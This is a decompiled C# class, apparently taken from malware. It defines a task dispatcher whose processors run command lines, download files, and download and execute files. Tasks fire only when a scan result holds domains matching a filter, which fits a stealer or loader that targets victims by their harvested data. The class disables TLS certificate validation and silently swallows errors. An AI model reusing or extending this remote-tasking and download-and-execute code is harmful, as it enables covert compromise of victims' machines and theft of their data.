using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;

// Token: 0x0200002D RID: 45
public class TaskResolver
{
	// Token: 0x060000C4 RID: 196 RVA: 0x00007B10 File Offset: 0x00005D10
	public TaskResolver(ScanResult result)
	{
		this.Result = result;
		this.TaskProcessors = new List<ITaskProcessor>
		{
			new CommandLineUpdate(),
			new DownloadUpdate(),
			new DownloadAndExecuteUpdate(),
			new OpenUpdate()
		};
		try
		{
			try
			{
				ServicePointManager.SecurityProtocol |= (SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls12);
			}
			catch
			{
			}
			ServicePointManager.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback)Delegate.Combine(ServicePointManager.ServerCertificateValidationCallback, new RemoteCertificateValidationCallback((object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) => true));
		}
		catch
		{
		}
	}

	// Token: 0x17000006 RID: 6
	// (get) Token: 0x060000C5 RID: 197 RVA: 0x00007BCC File Offset: 0x00005DCC
	public List<ITaskProcessor> TaskProcessors { get; }

	// Token: 0x17000007 RID: 7
	// (get) Token: 0x060000C6 RID: 198 RVA: 0x00007BD4 File Offset: 0x00005DD4
	public ScanResult Result { get; }

	// Token: 0x060000C7 RID: 199 RVA: 0x00007BDC File Offset: 0x00005DDC
	public List<int> ReleaseUpdates(IEnumerable<UpdateTask> tasks)
	{
		List<int> list = new List<int>();
		try
		{
			foreach (UpdateTask updateTask in tasks)
			{
				if (this.Result.ContainsDomains(updateTask.DomainFilter))
				{
					foreach (ITaskProcessor taskProcessor in this.TaskProcessors)
					{
						if (taskProcessor.IsValidAction(updateTask.Action) && taskProcessor.Process(updateTask))
						{
							list.Add(updateTask.TaskID);
						}
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}
}
